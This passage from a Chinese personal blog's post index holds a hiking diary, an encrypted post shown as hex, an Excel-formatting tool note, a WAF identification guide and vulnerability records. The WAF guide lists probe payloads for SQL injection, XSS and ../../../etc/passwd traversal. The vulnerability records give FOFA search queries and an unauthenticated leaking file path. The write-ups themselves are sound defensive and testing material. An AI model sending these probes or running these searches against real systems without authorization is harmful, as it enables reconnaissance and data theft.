思绪拉回爬山时的情景，我下山的时候，和Catherine、Elon有了分歧，我和Lydia想走小道下山，因为我俩发现小道更加隐蔽、原始，大道已经走过来更加熟悉也不想走了。但是Catherine他们想走大道。最后还是走了小道，具体缘由不记得了。下山时，我们遇到左边丛林有一个阴森森的地方，瞬间我和Lydia来了兴趣，于是踏入这像墓地一般的地方，我倾向于相信自然界充满了我们看不见的事物，犹记得踩在脚下软绵绵的，身边似有阴魂般的丛林，我和Lydia、Elon往前走去，最后看到了微弱的光点，通往前面的就是光明大道。 继续往下，重见来时路后，我和Catherine健步如飞地奔跑下坡，借着惯性，仿佛将人类性能发挥到极致，那感觉真是酣畅淋漓。傍晚五点，我们在路边等候巴士，准备搭乘luas回家。不过先去巧面馆吃了晚餐，这已是我第二次去了。店里的酱牛肉很好吃，但面条的口感，一言难尽，缺少劲道。 这已经是去年的事情了，我的记录不过当时经历的1/3，但我暂时只能想起这些了，等之后想起来再更新上，或者再也不更新了，谁知道呢。","tags":["旅游"],"categories":["读书计划"]},{"title":"2025年回家过年记","path":"/2025/02/09/过年回家/","content":"f17d1a24de7b8140c49464f7acba421fd073983823efeb100e47ec561282570c8ac7a7d737a1bf2a8f86a8048213b7688aebcb88f765f556f200f5b27d6ef26ec5c2bbc52707c2bdca2109ba8bfc93a1115a6575275418d391df38b2d8ec4d3de419d0d915c027d669e4b7f766e9cd352e48b8698d1f1d7a83eaac29dac901fadfbfd7e26e62c93b429126ce64943e0348be6446c5b07625ca5ebd3c257158f2e4cd29931c9a808110f7181f16ea92cc76c368e6a8c4f4e6215e48e9528805cc3b7da8be85625e685fa7eb7ed2d3a65c5abba4190fa4bdacc5719322720445ce7a6f781c16284243303d960e59848646dea0e28d295b5dc497680b70c831e0f8dd46490b0f87ad83a2d81a908b3a42054b4fbf358f18dc799b55df7c4a2c8104c56af53ef355ed95a10f4b8721ecb43b36f635c260d2e6ee8303fca5b7a3548ac8ede8b46cf2462b982c3642516cb936404325442c1ef302f12567e2d9c19c3f6aeb86867954366487c7e6b7fdbc70b12adeb087eb1e8cdaf60410c116473cd2825c23421cc2383fc8bcb1915c60ef8a3226c0feb75523fe659c0ad15834e7e255a67433610eb0ebe18bf4ac5f868cb80782645aede04236345fe0028d987ef087aaa973c99b43d60c6992851615be0f5a2666c35d9f95d484fb2ac037da8fb915898b08edffde5641f9b95c01186c6e8fee31937e5d2dfdc805eabbafd70f854835481774dd3c916cd2338ed09ff26333bbde7d3bea7f83f70af46713230003f6ba35f7bc4020f44b4d403613b462f6f9fda302be9974c46d404c9cff8ec44104222b541654eba5a307c927b1f7f04e3ee65ad5247ce6e3232969f65dc9c986b13be34b613b2061a7fc94a3614b83781ea252b020214e8eb9452ad6a50c3ea1a67dc0a139116b62145961e373ca4ffa0ce32d4a231e62d598f92a0718871e27d8300260885ad293229fe840fd154db28a02ff6a1410ed8ca7121d13b02b27ee6a64897eab175768305156034a6a824e222ece38319feaf800ee9817135f108e1a50cbc9ab43e9542b2e6494fbac4e8f92f1b56455981afff8ac67a798fb93b8bcb7f157df0735620a3950b9d7bf90532fde2ee109965a9b2d42fafc6eb9f03803da1cfdbba5b8dbe66abab60b8f2eb55a79a3f70a42d0999ca3950f7cd93ce0c3595bd434839c454c766b67f2b9ec4c81131e5026910706896094c2da4106b7ac43cb156f2345fef51ad52a55c639039d132757bebca75d689bd50e5fc164388781e67d7987413581ac8646e2e24b5595e2c20e98cc68ad19656c3da7564de7f99bf53dde6b0274502030e6920a1589058371f9824f18494a11088141932b26932a80401a7e9236bdcad749540669fdadbf3557c022b8e746effb908d93c4c035ca52cbba76e403c008584d6ae8455aefa9a4eff091a65ca3fa214e620cda83eb7ba999fd94d820823c6cc7060d074ce8209039225d613e77e8a079c500894d5dfd7e249048d5f4d0566ab1517a3f5c9e5538ff8a0549532d81e54520dc66bc0269ddc21eb6687d9929f7aeb9c19a66ac1c4c3d866a6de2b189ce2c792f8b9215e0508082ba51107ebc6f49e10b4e45689c60bf307253ee67556cce809a7b86b71dd45b8d8d30e435893b3640c5bf1bea027f26a4d05b0374e49a81824eeaf258902ac0e51171b1fcaa9ada3b5f2c1c876ac0fb0127692b8d151b64677738718cdece8c3ee8215c7964454b81c55e447d87a64918fd5467b67a032c80fc6cef65323b59c364bdc41a1f81519420f6ce1a2ebf45462f9fa85a5adc7dde1fa2752da3cc4fa5d21bf110815dfa3197fded91fccbc225622338cdec29aa607bddccd61864bdbe80f99d72942a06b313efd15255a9473f136de3dfe3d567ddf782e6aa6893d209654b4eb39f3af0e0049d6ae5ef962df2bcb1bb67b6bf7bfa2a4967d14b44980e68680784328e1d895c9a076bdcdfdbba4875dd65dd115976d6de7b5065471c4a48f77b3c86ce15b5c2ef1455d42139ef935b9fb68550f23dca6e23f15c7f227e8d09be9ab21af55a221c0007b612220b618d2c76a2094a518265cbea42b325f967830d41b599dc39d8b8f9fa59066fede171cfa0212abf4377690a0b63e23491812a1a80d402781c40fcc31d52b5ce9e443b033d89889b0f7389f30ddb9e0574fe50180021b7eee16e10ed69c70812c44711a1e98a176ee7a8fd91a1d051ad52f8d5f687572653aae9d632d278480f6f867ef6ca6caaaff62dcc0e5189059733a2b1713e15c301c2ff279186c7cd2ca1465ccba3966613f4a0686748b6f1e3014b9bde182fc93ef6c74f7186c32a95d8ed8e55a46d3f58044359c67daf0caa2acc02f4aaa5a4a694df41012c796fc40f2946162f81ea45404e2425dbbbfc27b06a48ca33418cc96229fb00fea40ef33cb7eedd1c1b380b769269fecc680d90cd467ae3f493b954e836232f889f93075f17aa95add9bf409158b427743ab57ac8ce84ebc51e10e5f6b882a79249c2c17bcfb6c82e544179624a0917389a702c1d1a8efb10161452a951a994f0f16634567e70e92f284d09dd6cb20e331dc1f60e02f6e681d966e5f516557b0a152b1240c954e5f8858193923820ecf727bf908c5224bb5f178a441986cfbb2a367423899ff21e5f87d0d0e8dad4e24192b21c84db2b50975e491c680fb636f1ad18e9ba7ad3db92cc221c0bcfc15347cec83b6c5b7fa02bbedc880c5546b53e065c95e4daca81d3ce3c455e9d5f326fe6204ae393d52857e3cfad7a2e2e105c560fcd8fbcdd8579418708c64d0cabbad6647d720cca3e62b198f6ddf55bf66dec29ea417222d8986be3fa964a16d2d18900ffce20154eaf7924ffa46379b5a9f0aaf3cc1d6ce52c5f39a1bd5f3010d341ce4f0d2c2053ac7b9532629eadb7d23efa6acf576804d527c70cf0e02d038311d56ecd051f19b5957d536de6af085f92c02fb1b0bf64582a2b59eb62abb28031260ea1bba7d61e1323f104f87b8aef54f6edc6a1e1f4a735a0f9782c915e8d9efb3bb9d8e2361dd2a575bc354a9516ff21604774f168e4ed61c8aa336a7da908be3efb5876313d9d2cc7d261db1f69ca35fe3155fd0686d34bcb17f2db2be6b36d7831ffceb16a101b9870c37405442383a035b9e8709cd590217615269e9e16cab85796e5832e7b7d01a87e5cbec5e3b2364d710901d806178ade1ef191b8b34ca7bb84569cc8e2bb9d478ce5c1facf816ca438974c2ff561b9c03dc0eb8bb601c0b1ee87a1808300e5f3cc6b2598e028690f15f3339ef2f9d238b98e2b828d9d01c1c6aeaedbfefd39dee3bcd4e254f735d3313a5bf75a642e980de87b66ce82c80e2b48dcbb12f5d1d0ebb32e7550d76c37305e019fa0bf703cce75310490e1eea7ac2de0d845f3c5f3f8d03003f81edcaa7eadd0093b6d2d430afeec2d1dff4cc93e2f7f6d499e6d18ebd714a204a95214f4707f47d96f14fcf1e00cb97aeb4b18252b4a6a5260aea44e6723c81c97106641d8b6e6639c24b5de6b0d842163545773b81b23341807bbac455a017a0f0ea772cfceb00fd45dd2a5e7d3f981b94f057b3904e33eb779dec02b2c611d641b666136906a4001a66641784ebb8dd2f16acee3da49564769d4884dfe4ea7bee0db615768fe3c546d2af140abeb2552649e17fd52da9319bb6409bf719e3ed644c138a351c3446b07e7df0518716d17840a7894548c79e35e2ab0732668c68a72cefd62b4af3ea3827c572d08479923a48c44c448847cc3bd81891da70c8f6a934942497adb84d772bae640e5a8b09811d4d206f7ea970ddb9f3e751028a5307f25e956d6043d29e8255af4aedb2038afe0ff4f8f4d5b506ab282980b18c69d74e4a90b23a58b0d452a12eef7898e088882ded33f215131c0c6a4f8928937c16c87c82f7054eac5e20e0d558d68f6dd85d65133c3118137f83d090df64057b983ab988517184d8d8d1d5e4f7ba7a6b52ed64bdad48190234f7d09c7efb7862c8bc863e0e6e8601f0bda2e9631b45c1bcf87fb05744d62c54237721ed8c2c69f3209d8ceb51e4de50450673c9811f99af06ca952c2cd960d5008ae2cbfdbf47679937ad2a73d755133da14dd4b769bf054ce898dd5203c22633987f349c1c8be37c50a4aa852b664fe7e87bba60082ae12229f6ad08738334c0bbb0fd71f20c3a6af3eb9a1ec0528565bf02a5d865ea18d41f616f3661b579fa76f4738036fb02c073568d4a01f5fdc3a41ce50c3ab8ab95763eafaf52659ac0d25de04d603ff22c0ded5543ca795869df2e097481ac77e7026fa16adfd2aeeed731c8953ca2caa7623f01a791c8cbdae525eb9e003f4095be8d1fc04dd8acdcce5c031e46e698c7138b36925c51ce025fdf5149055d575d5d52f4e36f34b5e23b9ea9750e8252f2f9fd7310fa21a6c2eb9b8dbb25208414e907eef7af2e7d70e2bd486c2802a9f7aaca60ded215aee88d8f5b84db17b77e446337cdb05702eb197a869c72e90149026274087d34331dc32e9ad893d1581278e6cf469d40f76241bb47e1a281e31bccfe8b9d733d013f445dc249fbedbbd22c49ed9c356f5c2f21831c05ee11c867cf3de5a62e2ebc6cfa4f6006bc8298d3376ba48e1944f5bee98c86437b4426154790b85b1bbc9c2fefd64003f4d38923cebf17a82333eebe0845107aa63221915283af8399014a5e373e9ead7640f873a42395e0ebeb4c1f4439a2e5bed2da3ddab141692fc315298d700ea2ddb540212594226364e754b2d361c9fd51f3d10e43f3d82e4423e9660884a3c0210fd596321cb5ddebb36b2fbccbe00d39db68c587662832909117e818d7e04ff4501ed02847dda9d131267ee9c4e7f2ac9949e9b2f797ffa9ee386cb4279dc7cfc35e945ebd2cfad6ab1ed093d362ca787fb5f4a2faca29d6e127b1d5c174eb91606ea475882de589c13f13c5b835bb9bc1b7ccd80ba2f4ad03fa491375c6056ccdb87d2eac9ef2ca1bd0fdb5604adb5759f34f627b9dc8a14314abfa9d0f877a9ac6bc298b4d6a136142fe7d50e7d003e496e465eaaf15980ee8d5920541f86f6c53dd7eb5e6ee731c4947e62639166a1624e6cc86a8b21bf69ec42c187cf088743c33c1babcdfdf8ff0048f49f511910e65b4fcae0bdcd93b6d3730d55236e34b17ed69c9484bf9e08c04356fe696801d51a6e1237a31dcf9979706fa2f6ed17c1a6e2ecb408acdeb81ac581925ee3039f1f1561acea3c85011796c65ae13d773ae0fc6223f417d1ef37e61327be96e49890cb712c79b95ebd84b29afdb51bed248750fd932d9c86f531ff8a08ce7806048864cb26eb53a90d046c5e9878df667c6518a55eecbda2c32e2a170145c217b9cd312e7aaa8f1cd5a96f4b49cd02190dc22ec4f3f0f5267fdc3dc507797abe1b3da42aea1ab824cb03900a89278a67adbad67f02dae2c49f27a479824cf867190647ce8a3618dc19995ceda4aef3aaf99abb80c1d4f5be7a6f3840ec9a92a7bcdea25ef3cdaf2af104bfc3028b7684247b57cf047a1f7536784bc9c4180edb973f73cff61e8e7c00e682669a43a6a4fc609ea028ff575dfe561aba409269781df87e969abafec1d89d223feaee77a837219e3fd9556ed460b588b3f52b2f9492ac5ea3bd5335d35512566a425e3bccba4d20d18409868ac8dc92b58f92c4132170f72c666c19ad77f39df03ac50820cbad85f9a005bf3d57e2f8195200c658a47107a78be6e21419d50685b58fee33330ebbc09c53b6d541f323a96fbdc0d183a8bcb56fd0dcbac93537bbfad2db1d0196ce08a911a1e73b338f23514cf749e9c2892dc36c1eaac193f1d367816799f6ef95e142f4879078034b2f2e60fa336b89360158bda2992c95aa15c8c5af723930c590cf4622148de2106af0fadcf164fde7233787849eaa02b3800a0ddf1b842d3d43a61cbe98ebfb35ff71bfdbb461474b47252167cc5a8d26449f400652f7f716ff4bd216070252aac6dad9b45963a0943f993f800733f29a7b742278153e41747177ea064b686ea6fe5d6e59585abefa0b720fa9f3f5c8e1a69c27e8b6027f5de362e1742bef9357b03fd594ea1c188e79ab125146e6a37271164b554f1f775cc15102786e9304da73c4f95b87185bbb6beb9a766c6d853659fa5e7428f84307b17b7047974680e8a89eb89cd2022438e88af520ba6d38259f27c3f5f2fe8eee1cf3438cd723ec881ae271138f0006c18c9d6f7b6548a8f309a233690f701f557c8e8d7773aadb0cc25e2810ebb143e2c23a4353145f4f62bab9683ce02aaa2aa0eb7f4dcd380569eeffbe116085092086bf1fcaa779325493e6f5d7f70a3a76c6c74debc93c658a3dfc15acd43037ae71b59cce95cdafd4c3d300649e78b07a1ee55fb803f6fd72023b17f645eabb9d125f83a51d7d1f73b2081aa38e6529cd6ec98487f1ddaa543fb1682d21eda9616f9bab7b92019e49eecab2b2ebdd64e0db36ebd17d97d507058bebedbdb54a8df9a54e92c462a2dc5707be8be82d99f0f36032c7e57840a3afe9bdda42acd4e60e32220c8fd55171683814581029a37a4b1fe1e2fe53057a82ac65e2641c3a117a4640f797ee23a867d6f37691a00b622a1e75aaefce26ed5d6fc31155d9b5afc627eb1cb14facd060830b6bf4df9ccb9a5bc92c973baa9429fe78e32403c1eb98bb0cfecb7362a3edb2c7b48d315f4598fc62b835b969d0b25b6e148f05cc8445b87fe989a3717442639d7cd4b35389597ea64cbf5b29a12931f1bfd5bb3d16ab3aed14981b5d6a29d988451b42bcabb707d4ba994e800e0e59df12d7ed876686090dc35ecbf7cd3989434150deb5b6f6bc3cd30be75854c6fd0bd54352bdba8e81addcbca72fcefff7f746294c3e92836b7af10a6b58eee6f56f08e5287db7211759103e8e8b869bddda159e450bd17a58398dcf96ab0c1d81d6c15b9548b83adfa7cac63324614b29e39552860d41f4c534f0e54a2a0e9b0d957b26db48545e338f595569e181bee8b0284420ad85b9021aade31ced67b23435e0f84526abc71b01a0cb1c33039673429cfc6e0142f849723ef67d240f9f859f878f930f123f56c7acfcc04a21f15063c62aa54f32bbb0c5cb527b68a21f2fbbd6ecf544a8fb156fb17d32d073227071b5ce93ef1255233b53d4e82f3704d5e49efb5ca056955d5935ecd2dd04653628f65819644dd82a6d2d646e77703e3c09323254b130e00f0f96d66503205088b97ad314c240c08b2a28d13e66406e9fda6149266194599ce6639b0c5f302be49992fad8952bcf809c9f096d018d1c3ee9b7ae938d5db1c8221808c21cab48b536de774a9d83aac43ca5497ad7481bcbbd5d45f4bd1b499d5ee26817ebb9823c2a56bcccb5268e555356904e850269d3edf7491e5035b2ed000e9b5b4a139760924906a6c01c15b09e099ebff28f91ebd2598d10e8314f9c50070b2b18e862821942c6e67853e3728e3285c7ad36e95fdb267ff6e733843464065fe49088349ac4a993200ae4c1607fd5c45294f007247371e9989f8f0551d58a9e4842acaa3e73d9e8c91c94cbc41e71fe7532bcbf7f108d150f295f4483842fc0361c9a89acefd05d9806d9cf7257e4062664f94eb8f4f57584c7604244d2a699fb7cb4d6cab713ce068bc2d23ef8d00c5e064d6410cdf2d9f2f4edcfd0546ababc46862206cb671d0ad49e1a0d192ebb99df15a8391d2eed70b6cd7cca50cdc735755c80d16560f547dcf069813e8ded1ab467db52a8a64e899424c251c0fb975dede18dd968dff35cfc389cdf2d4302ec41ff18382173e291e78e01afa5c4710896e6fb5298bb9a3a0e6b7471505069fea44de544e050d0c795210d12bc31649764ee4c3f13cb1d6aa62c6ff7adbe25b9b1f71f5b3ab31117734b38488a2e3600a5606faf2322e9b9699271ea4b74c342810e4df65be99c635aea3f88c70d9adf2377934118d3b87e4e0f36f2230140e19d5465ba8b7e414fcd0ebefd578f21da886cabc7875e8c70e6b466a20500f833828d3e29fe3ca038327c4ed6069e1e395ab93b0f273ad083ae981a6667df89dbe3ce74a196ce24cf29e8ef986f08ee194566961fabaca4f304b622518b2b693be3541ab8d7b0a69bfa359c272b742fddeb0f8e5de8b957cc41e231123d56c468570bcd5a26bf2d2338878aae1d40472af9717a92ab7833e4902a264c832528a6b9153a3babad819e0c6a864b16e0480147eea1830ab12cec75fe3b884a3e8665a5c0d5928862bbcfb657a934fe18a02db102578a0772f7b71b56b4fb44ac97f40c0e8c2fea16f01bfc8266798bc15725e3ce66d8632232b9092cd706f9eff0dc3e3ca6fe3324a5918c797f50b6f35e31d4d76c21b4733f86aa26734b2f8177430883c9230ef3d652c1e84d6b3e92ad7dad6dfed829bc6240f50fba7f2af0deccfa80613c7eff81daaaf7c54609cb1c7ab54565d4245874d2382f736e040a40d01ecffeda8608473b41ccad107c663b120304fe511b148dfc5f0ba84653ff398e4aa8a3be3e63dbb122999278b13553e0651ba81adddf5ae7c8c5f29f491b5db7075e58ac7cb40fcb153015593bd0fb6b43b2ca38f50d9d9fe167370b5dcf24f5672b2c0195bbae760e123dc883e40901fdce873775e0555e15c6fdcc812ade6fa9b6be6175bf4a5feb26c68a7dc630e97cb8934b79096fb128f82f57ad37bfa316a70ad3c3df670abc113659c8fe5593866bbf19bfb9579d2c1436844452b55f1e6b7822a231f78a6448c7384f4768b3cd4d7e967867f9874997f06501308250970853e53aaf9bd3cebd9b315f24d5cf2490b4d242b08177f9b1e9bfef5d4b80df708f17f48ab6d39e46ca55a323a71a2b60caab6a846e970100d88f55950e6ba525c84136a6bab75ebdb1b3aae95d469d28f9dc838618b3d5a203c252185c29b836311f8fb40d5d7aa21cb2871451a2c68aad458ca56cd7a38c940da6c326bade589fe144c11fe22199459da2bf704c8a99a109896ab622457e06b82a07f20896ece8a3b4ca5643f22be417062211f2bf29dcd5f707480943a1b81d7dcd2751bebc82c699397659f9733015a77d412f5bc83d565e3ac402f974c02782ee01d619be7826d382aa21d368d17bec3f497f678e87aa53709939e2481aa76905f2e514ebc3a6abfd6d4616be52b8caf02c8eb338deb9707c75311e17cfdc43c951fdd6f16bd632a0e1c4b648698b3bedca46c3420cf79ad5ffc0c17d1e99a3057c85d8e40af96af6a817d85c44574fbad84228da8f1ae1d63af9270f1fe96a8f556b0cd4d698d7b0dd0469c91f179a4a186a8b8f55c0d3be647cc2a7e3231c12158a3666c21c563948b0efffd130734473d639e8fc9af01b81ea2089c4ad1ed25fe40befb59749e7b67e14a892bf6acffb1d82f4d4d14fe51ba8926f5cd95e3400793ef9bb5d06ad9d1fddc1c2ae74c0a5928e0b8767b83c4f9129c8a7361f15cddb7dde4cfc20753bc7d9536325b6d561465637e420a6e856648eafc521e20a068b8a34b59a4aa2a70583f2dfaad2b680f2c5547f8a60ad9347376135eead44e7e4f7283d4885bc8f181375ac07b84e94c3ad3321cb04e93de8e924269cedecdec4405e9f23c9eda334336063a1dbc12c99bfe8dec2937d50b0cff8885990cc51e0181d70d6c125b77303170ae0cebcbf38a63694937ef17e7b2f1b86e31c0e5af13d7ebaa4a63fc63c34ad647df37fdaa75483855e3fec71982454448e68a029da1a7116655ced3ea681df5dc2559cb60a3d5410a41270e1800014bc29912cda7e1ed841bf32b6d4b803f43a08ca915063e137548cce04ab293190023fcf8bdaf34a0e272a5bd62e63e192325b3e466fac2d0eb9379c0173175ed17695bfc674a869e28ba717a02e6e51f6d185753cbee03f7356851c652eebd49aa3aa1cdc7d7575f7a8cbad723f53446eae4bb3863ac55171b1a680f346c3590206fabdf129b2d2dda84a137d40dc81ccab9f38d77237339c90e78464c2514d41cac931aaf1ce8d4c793afc28e00e75626f81112fd684b21bbad20f54d34488c424e85df27b21b3096d35cc0104087cf266a6603f37ed5a5e1be9b453a4d499b163c8a640a1c20c46f8be7f8cfc709febd78b3099ac9b554495fcdf84c2f59b921203add4ec9833752722c09a51877d00cc7b01325e6d0c8cdf0a6ca0526f650de7d3f382322157f5d42e20bf8915a445f5b35622be2ddd25d7ff0142ed3e107baaba244b375c9aaf79bae50074f27c56991e2dd3dca18b30c1dcb6759695a696a80a26a46749f5a8c3f83d11b4c4698676ff66dd9035f15d675d147357de96f1fbe839da6b7da22e231d95a0438980784248fa3b31008cf0363be6732023376507822c6e5cb936e098da7b4a53eba341071f0000a8d33b96daa594fe3faada25618ea5d6e5e9d76888f8ae7e1ab825ddfb9162f43efdb8d727580e28f981fa3f2653d0df50ec1c34d3de61a8ce2d13457619987b2772d604e5f571742e76cc9a38df05f802364595809a54ff104e2d7bee946690e0f61958a7f2bb6279817036483374bdb43f4f08f328fe15aa881ea35f263fc6b9f3f6bf3a530c6388ecc7fdcc4c0f6ee207ec7ca04b26740a42380d59d98a8d224d1c90d2aa9f75ae1de2798d183d197273b47a5b95b86d07544a9d272b7cd09ca1bd9bb47fdfc3bc1d75678d84deb1845db02ddc21bf8f1fb7c7eb6e3bbf7e58a38b190b140578da0159a97070971f2afd0ee2e78e2ec56731e243e91944620deb8e22248513f228baf41578deb4a7912907e75baf9c350a9c22913a0e36392155b9340513940a96f57b2df84188844f9af4f3a669c895dbdcd459dc588c8e1444debdc91d0e92deb25535134742e59a5407ac55da5c34155225aa36f268e7f84137e6b32364a2c4543bcb8f62476346204024bc9bb450072b5778ddb02fe3decf58bee56eef629dd8386801f4529771ab20aa58ab4a80cf674bdf6bb39addfb27a497f8e85384eb42df64695259ba87cbab27a21ab3220cd207e03bd6ef39d0d7922d599e033baa294780d70db309f950eb5e763c34c9c2253e195256988bb6100e405b94524695e83acd3d57ca0869683d821fe2f9267e7e2a86b74ab835569719d8fcf943b9e1728a085ff808fdc0c1250fbcf83fd5ba38f46dcc0f4673b6df84af22eb15f4248d5d63fa79dfa9efb0c32f70ee162f595b599b7a9d179257aa9a7e68b71737ffe75f97ec23c812545bdcf49690d409d94d53279a7e66d32f0a87e0c2d42f79b37df44f2d9bf89a9bc072a272af90d772407e01ca4f11b9208c7405442384334d1cc872335fa58b3538c9b8412d09703c27d2f2ef0385b4fa6385a9c806f6e9a181c1c968362343a72675f845a535a6926dae49f0980c21fb2c5cc825696de8481122a35271e628525368de36d3214ce5bea05c21fd1b9a7c5c33bf52db96340337ec36176b4134c5112923e8d0e1409f8a7e11ce4b53ca24d56d748ab30a3494ee4bbd45ec6c8c4b9e1dc3e90948c609f3a890961c68e61b7738bcbf922b1915819315c64ec71f15106cfdaa183a10bab1808e354a20e29f41cf5e458fe0e2d27f47a03782df4dfdaf0972cdc5b1b1fe03648297c5c961701de63bac8e3bc930e3169ddb00f42038747b009cf6ebadcd646d3cb42a4b6e4522fd2f2f3bd458d5356b2d7c4b01a39535e6f220050d5b59d2804f6624196f3be20330dc65e0df8c1f73755a35e731cc75c9cb50fb2be8471e1fe0f9283bc1204d9310493cdd2ad53760c1916288ac1825db3bbd33591f0511fc9fad8a1c0bca5895fc494920ebc65639aa7e4a1450fe35de20857fa77569b3fa42e5ab4a1ea8fadf944ea7b671f933844a97e818f48c00ddee21f0961bc981112a2aedb04a4a2a65440b53ee5a27e7b0374e297902c3e5d1dc60eeebb9855f2fa1278718b7d779f4bc70f58c70132b91bedaea3535bec69c91d1552d820946b6b6bf7d763f04ed7a3038a36e256fc517e776cc17b95597400547c546a2292b423f8245466c2cc8a428c278d261dfb2ef1b5dd41dccab6dd552dcc7ea49dac09b91e5f461e18f824ec257416f228dc934ffade99f88c5b9779169690223bab063d25bda1865985952f59f9396b0e63e30bb7a1bc935622596939ae0f1e18d7ba605206085ea8ad8546d4cba2532d8887afa30eca4123d5ce427fd0ae593ee2735f567c4e7b71efbc2b8db30fe74c64d8a1253f98659cd7348086f35a0148fb1748145b6258e636ccd2d96a0834be75953d1165d831e31cab860df167ca9fbab5f2cbe48e901f88948cad067fe 欲救生快活，须下死功夫","tags":["NY"],"categories":["杂谈闲记"]},{"title":"自动化 - Excel格式化工具","path":"/2025/01/03/自动化 - Excel格式化工具/","content":"概述 本工具用于格式化Excel文件，包括冻结首行、首行筛选、设置首行字体和颜色、居中对齐等功能。 之所以有这个需求，是因为在日常工作中，在向客户提交具体文档之前进行格式化处理不仅能提升可读性，更能展现专业形象（尽管有时候是表面功夫啦），再加上强迫症作祟，总是忍不住想把文档打磨得更完美（符合我的期待，期待未必是正确）一些。 什么？听说您问我是如何搞定的吗？当然是使用了大名鼎鼎的Claude.aiさま。如此依赖人工智能，也不知道长远来看，是福是祸。 命令行版本 特点 *彩色的命令行输出 *双进度条（总体进度和当前工作表进度） *详细的步骤提示 *时间戳 *预计剩余时间 *完成百分比 代码 1见Github... 使用说明 1.安装必要的库：pip install openpyxl tqdm colorama 2.将代码保存为 .py 文件并运行 3.输入Excel文件路径即可开始处理 图形界面版本 特点 *图形界面，包含文件选择按钮、总体进度条、当前工作表进度条、详细步骤显示、预计剩余时间和开始/取消按钮 *实现了所有格式要求 *进度显示：实时显示处理步骤、显示预计剩余时间、可以取消处理过程 代码 1见Github... 使用说明 1.安装必要的库：pip install openpyxl 2.将代码保存为 .py 文件并运行 3.选择Excel文件即可开始处理","tags":["效率提升"],"categories":["自动化"]},{"title":"WAF识别技术指南 - 更新中241225","path":"/2024/12/25/WAF识别技术指南/","content":"什么情况下，你需要识别WAF？ 渗透测试人员在前期信息收集阶段，需要识别WAF，来思考如何绕过 运维人员在部署或更新WAF后，验证防护是否生效 安全厂商进行市场调研时，通过WAF识别分析目标客户群体的安全产品部署情况，发掘潜在商业机会 一、WAF基本分类 1. 云WAF 阿里云WAF 腾讯云WAF 华为云WAF Cloudflare AWS WAF 2. 硬件WAF 绿盟WAF 安恒明御WAF 启明星辰WAF F5 ASM 深信服WAF 3. 软件WAF ModSecurity OpenResty WAF Nginx WAF NAXSI WebKnight 二、WAF识别方法 不妨让我们先停下来，思考一下，在开始寻找识别WAF的具体方法之前 设想您是一名网站管理员，需要为自己的网站部署WAF防护。您会如何在Google中搜索相关信息？ 是先上网搜索&quot;如何给网站配置WAF&quot;之类的问题吧。这时候你会发现，各大云服务商都有特别详细的产品介绍和部署文档。 比如你去看阿里云的WAF文档，它会告诉你： ① 要接入WAF，需要把你的域名CNAME解析指向 xxx.yundunwaf.com ② 配置完成后，你的网站响应头会包含这些特征… ③ 防护生效后，攻击会被拦截，显示这样的页面… 不限于此种方式， 所以，我们要先理解WAF是怎么工作的，特征是从哪来的，然后再谈如何识别WAF 1. HTTP响应头识别 12345678910# 阿里云WAF特征Set-Cookie: aliyungf_tc=xxxServer: tengine# Cloudflare特征Server: cloudflareCF-RAY: xxxxxx# 腾讯云WAF特征Server: TWS 某些WAF特征只有在触发防护规则时才会显现 （1）基础特征检测方法 可以通过多种工具查看HTTP响应头来识别WAF特征： 使用curl命令：curl -v -I 目标网址 使用浏览器开发者工具查看Network面板 使用Burp Suite等抓包工具分析响应 通过Postman发送请求查看响应头 （2）特征显现 WAF的特征识别存在动态触发机制：在常规访问时，WAF可能处于静默状态，不显示明显特征标识。但当检测到潜在威胁请求（如SQL注入、目录遍历等payload）时，WAF会启动主动防护响应，在HTTP响应头中呈现出特定标识（例如Server: tengine等特征字段）。因此，进行WAF检测时请多尝试。 而华为云WAF，正常访问也可以看到Server标识为CloudWAF，明确标识云WAF 2. DNS解析 - CNAME 使用 nslookup -qt=CNAME 域名查看CNAME记录的方法，是因为大多数云WAF采用CNAME方式接入。当网站接入云WAF时，需要将域名解析指向WAF的CNAME地址，通过这个特征可以判断是否部署了云WAF以及具体是哪家的云WAF服务。局限性是仅适用于云WAF识别，无法识别硬件WAF。 如图所示，这个是华为云 Web 应用防火墙 (WAF)的解析记录 阿里云 Web 应用防火墙 (WAF)的解析记录 目前互联网上也有一些识别WAF的在线网站，其原理也是借助CNAME解析 3. 错误页面特征 阿里云: 特定的405页面样式 Cloudflare: 特有的Challenge页面 安全狗: 带有特定logo的拦截页面 如图所示，这个是阿里云 Web 应用防火墙 (WAF)的解析记录 4. 主动探测方法 3.1 发送畸形请求 12GET /index.php?id=&#x27; HTTP/1.1Host: example.com 3.2 特定payload测试 12345678# SQL注入测试/index.php?id=1 AND 1=1# XSS测试/test.php?param=&lt;script&gt;alert(1)&lt;/script&gt;# 路径遍历测试/file.php?path=../../../etc/passwd 5. 常见WAF特征总结 阿里云WAF 响应头包含 aliyungf_tc 自定义拦截页面包含阿里云特征 使用tengine服务器 Cloudflare 响应头包含 CF-RAY Challenge页面特征明显 固定的5秒盾牌页面 腾讯云WAF 响应头包含 TWS 特定的拦截提示页面 自定义错误码特征 三、识别工具推荐 wafw00f 1wafw00f http://example.com whatwaf 1python whatwaf.py -u http://example.com Wafmap 1wafmap -u http://example.com identYwaf 1https://github.com/stamparm/identYwaf/tree/master 四、识别建议 WAF识别测试应采用多维度分析方法，避免过度依赖单一工具或特征造成误判，同时发送Payload注意需在合规授权前提下开展测试，控制发送频率等，确保不影响目标系统的正常运行。 五、WAF拦截界面 （1）阿里云WAF特征 等待更新…… 六、自动化识别WAF的思路 等待更新…… 域名、ip等区分","tags":["WAF识别"],"categories":["网络安全"]},{"title":"Historical Vulnerability Records","path":"/2024/12/17/Historical Vulnerability Records/","content":"一、GraphQL /graphql 信息泄露 12# fofa/鹰图body=&quot;/graphql&quot; &amp;&amp; title=&quot;Apollo&quot; GraphQL 信息泄露漏洞的核心就是：GraphQL API 对查询请求的访问控制不足，导致攻击者能拿到不该拿的数据。更具体来说，可以通过内省查询等方式掌握整个数据结构，并从中获取原本不应公开的敏感信息。 漏洞成因： GraphQL API 未对内省查询进行限制，或者对数据访问权限控制不足，导致未授权用户可以获取敏感信息。 漏洞类型： 未授权访问导致的信息泄露。 漏洞位置： GraphQL API 端点， /graphql 二、天擎终端安全管理系统 /runtime/admin_log_conf.cache 信息泄漏 12# fofatitle=&quot;新天擎&quot; 漏洞成因: 天擎终端安全管理系统对 /runtime/admin_log_conf.cache 资源缺乏访问控制。任何用户，无论是否经过身份验证，都可以直接通过 HTTP GET 请求访问该 URL。 漏洞类型: 未授权访问导致的信息泄露 漏洞位置: /runtime/admin_log_conf.cache 文件/接口 